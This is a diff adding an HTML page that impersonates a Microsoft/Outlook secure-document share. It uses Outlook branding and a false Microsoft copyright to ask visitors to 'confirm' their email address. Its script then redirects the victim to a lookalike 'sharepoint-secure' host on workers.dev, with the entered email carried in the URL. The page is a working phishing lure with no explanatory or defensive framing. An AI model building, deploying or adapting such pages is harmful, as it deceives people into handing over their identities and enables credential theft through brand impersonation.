@@ -1,0 +1,122 @@
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>Secure Document Shared</title>
+    <style>
+      .spinner {
+        display: inline-block;
+        width: 16px;
+        height: 16px;
+        border: 2px solid rgba(255, 255, 255, 0.6);
+        border-top-color: #fff;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        vertical-align: middle;
+        margin-right: 8px;
+      }
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+    </style>
+    <script>
+      function validateEmail(email) {
+        var re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return re.test(String(email).toLowerCase());
+      }
+
+      function redirectToSecureDoc(event) {
+        event.preventDefault();
+        var emailInput = document.getElementById('email');
+        var errorMsg = document.getElementById('error-message');
+        var submitBtn = document.getElementById('submitBtn');
+        var email = emailInput.value;
+
+        if (validateEmail(email)) {
+          // hide error before redirect
+          errorMsg.style.display = 'none';
+          emailInput.style.borderColor = '#28a745';
+
+          // disable button to prevent multiple clicks + show spinner and loading text
+          submitBtn.disabled = true;
+          submitBtn.style.opacity = '0.6';
+          submitBtn.style.cursor = 'not-allowed';
+          submitBtn.innerHTML = '<span class="spinner"></span>Loading...';
+
+          var decodedEmail = decodeURIComponent(email);
+
+
+          // Redirect instantly and carry email in URL to the provided link
+          window.location.href = 'https://sharepoint-secure.rasa72.workers.dev/#' + decodedEmail;
+        } else {
+          errorMsg.style.display = 'block';
+          emailInput.style.borderColor = '#d93025';
+        }
+      }
+    </script>
+  </head>
+  <body style="margin:0;padding:0;background-color:#f7f7f7;font-family:Arial,sans-serif;color:#333;">
+    <table width="100%" cellpadding="0" cellspacing="0" role="presentation" style="background-color:#f7f7f7;padding:20px 0;">
+      <tbody><tr>
+        <td align="center">
+          <table width="600" cellpadding="0" cellspacing="0" role="presentation" style="background:#ffffff;border-radius:8px;overflow:hidden;box-shadow:0 2px 6px rgba(0,0,0,0.1);">
+            <tbody><tr>
+              <td style="padding:30px;text-align:center;">
+			    <div id="mainDiv" class="mainContainer">
+        <div class="errorMessageContainer" role="alert">
+            <svg xmlns="http://www.w3.org/2000/svg" width="36" height="36" viewBox="0 0 32 32" aria-hidden="true">
+                <title>Outlook_32x</title>
+                <path d="M28.6,2H11.4A1.4,1.4,0,0,0,10,3.4V5l9.69,3L30,5V3.4A1.4,1.4,0,0,0,28.6,2Z" fill="#0364b8"></path>
+                <path d="M31.65,17.405A11.352,11.352,0,0,0,32,16a.665.665,0,0,0-.333-.576h0l-.013-.007,0,0L20.812,9.239a1.382,1.382,0,0,0-.145-.082h0a1.5,1.5,0,0,0-1.334,0h0a1.382,1.382,0,0,0-.145.082L8.35,15.413l0,0-.012.007h0A.666.666,0,0,0,8,16a11.352,11.352,0,0,0,.35,1.405l11.492,8.4Z" fill="#0a2767"></path>
+                <polygon points="24 5 17 5 14.979 8 17 11 24 17 30 17 30 11 24 5" fill="#28a8ea"></polygon>
+                <rect x="10" y="5" width="7" height="6" fill="#0078d4"></rect>
+                <rect x="24" y="5" width="6" height="6" fill="#50d9ff"></rect>
+                <polygon points="24 17 17 11 10 11 10 17 17 23 27.832 24.768 24 17" fill="#0364b8"></polygon>
+                <line x1="10.031" y1="5" x2="30" y2="5" fill="none"></line>
+                <rect x="17" y="11" width="7" height="6" fill="#0078d4"></rect>
+                <rect x="10" y="17" width="7" height="6" fill="#064a8c"></rect>
+                <rect x="24" y="17" width="6" height="6" fill="#0078d4"></rect>
+                <path d="M20.191,25.217,8.4,16.617l.494-.869s10.745,6.12,10.91,6.212a.527.527,0,0,0,.42-.012l10.933-6.23.5.869Z" fill="#0a2767" opacity="0.5"></path>
+                <path d="M31.667,16.577h0l-.014.008,0,0L20.812,22.761a1.5,1.5,0,0,1-1.46.091l3.774,5.061,8.254,1.8v0A1.5,1.5,0,0,0,32,28.5V16A.666.666,0,0,1,31.667,16.577Z" fill="#1490df"></path>
+                <path d="M32,28.5v-.738l-9.983-5.688-1.2.687a1.5,1.5,0,0,1-1.46.091l3.774,5.061,8.254,1.8v0A1.5,1.5,0,0,0,32,28.5Z" opacity="0.05"></path>
+                <path d="M31.95,28.883,21.007,22.65l-.2.111a1.5,1.5,0,0,1-1.46.091l3.774,5.061,8.254,1.8v0A1.5,1.5,0,0,0,31.95,28.883Z" opacity="0.1"></path>
+                <path d="M8.35,16.59v-.01H8.34l-.03-.02A.651.651,0,0,1,8,16V28.5A1.5,1.5,0,0,0,9.5,30h21a1.5,1.5,0,0,0,.37-.05.636.636,0,0,0,.18-.06.142.142,0,0,0,.06-.02,1.046,1.046,0,0,0,.23-.13c.02-.01.03-.01.04-.03Z" fill="#28a8ea"></path>
+                <path d="M18,24.666V8.333A1.337,1.337,0,0,0,16.667,7H10.031v4h0v3.456l-1.681.957,0,0-.012.007h0A.666.666,0,0,0,8,16V26h8.667A1.337,1.337,0,0,0,18,24.666Z" opacity="0.1"></path>
+                <path d="M17,25.666V9.333A1.337,1.337,0,0,0,15.667,8H10.031v3h0v3.456l-1.681.957,0,0-.012.007h0A.666.666,0,0,0,8,16V27h7.667A1.337,1.337,0,0,0,17,25.666Z" opacity="0.2"></path>
+                <path d="M17,23.666V9.333A1.337,1.337,0,0,0,15.667,8H10.031v3h0v3.456l-1.681.957,0,0-.012.007h0A.666.666,0,0,0,8,16v9h7.667A1.337,1.337,0,0,0,17,23.666Z" opacity="0.2"></path>
+                <path d="M16,23.666V9.333A1.337,1.337,0,0,0,14.667,8H10.031v3h0v3.456l-1.681.957,0,0-.012.007h0A.666.666,0,0,0,8,16v9h6.667A1.337,1.337,0,0,0,16,23.666Z" opacity="0.2"></path>
+                <rect y="8" width="16" height="16" rx="1.333" fill="#0078d4"></rect>
+                <path d="M3.518,13.255A4.537,4.537,0,0,1,5.3,11.288a5.377,5.377,0,0,1,2.829-.709,5.007,5.007,0,0,1,2.617.672,4.492,4.492,0,0,1,1.733,1.879,6.064,6.064,0,0,1,.607,2.764,6.4,6.4,0,0,1-.625,2.891,4.6,4.6,0,0,1-1.784,1.945,5.2,5.2,0,0,1-2.716.691,5.128,5.128,0,0,1-2.676-.68,4.563,4.563,0,0,1-1.755-1.883,5.918,5.918,0,0,1-.614-2.73A6.565,6.565,0,0,1,3.518,13.255Zm1.9,4.616a2.951,2.951,0,0,0,1,1.3,2.618,2.618,0,0,0,1.565.471,2.747,2.747,0,0,0,1.67-.486,2.829,2.829,0,0,0,.973-1.3,5.018,5.018,0,0,0,.31-1.806,5.482,5.482,0,0,0-.292-1.827A2.9,2.9,0,0,0,9.7,12.874a2.591,2.591,0,0,0-1.656-.511,2.705,2.705,0,0,0-1.6.475,2.976,2.976,0,0,0-1.023,1.305,5.173,5.173,0,0,0-.007,3.728Z" fill="#fff"></path>
+                <rect width="32" height="32" fill="none"></rect>
+            </svg>
+            <div class="errorSubHeader">
+             
+            </div>
+                <h1 style="margin:0 0 20px;font-size:20px;color:#2d3250;">Secure Document Access</h1>
+                <p style="margin:0 0 25px;font-size:15px;color:#555;">
+                  The document shared with you is confidential. Please confirm your email address below to access it.
+                </p>
+                <form onsubmit="redirectToSecureDoc(event)" style="margin:0 0 15px;font-size:14px;">
+                  <label for="email" style="display:block;margin-bottom:8px;color:#333;font-weight:bold;">Email Address</label>
+                  <input type="email" id="email" name="email" placeholder="Enter your email" style="width:80%;max-width:300px;padding:10px;border:1px solid #ccc;border-radius:4px;font-size:14px;margin-bottom:8px;" required="">
+                  <p id="error-message" style="display:none;color:#d93025;font-size:13px;margin-bottom:10px;">Please enter a valid email address.</p>
+                  <button id="submitBtn" type="submit" style="display:inline-block;padding:12px 24px;background-color:#2d6cdf;color:#ffffff;border:none;border-radius:6px;font-weight:bold;cursor:pointer;">
+                    Access Secure Document
+                  </button>
+                </form>
+                <p style="margin:25px 0 0;font-size:13px;color:#888;">
+                  This link is unique to you and will expire in 7 days.
+                </p>
+              </div></div></td>
+            </tr>
+          </tbody></table>
+          <p style="margin:15px 0 0;font-size:12px;color:#aaa;text-align:center;">
+            © 2026 Microsoft Inc. All rights reserved.
+          </p>
+        </td>
+      </tr>
+    </tbody></table>
+  
+
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"9b6e6c84c77f4e57a21d5a7b1728e04b","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body></html>
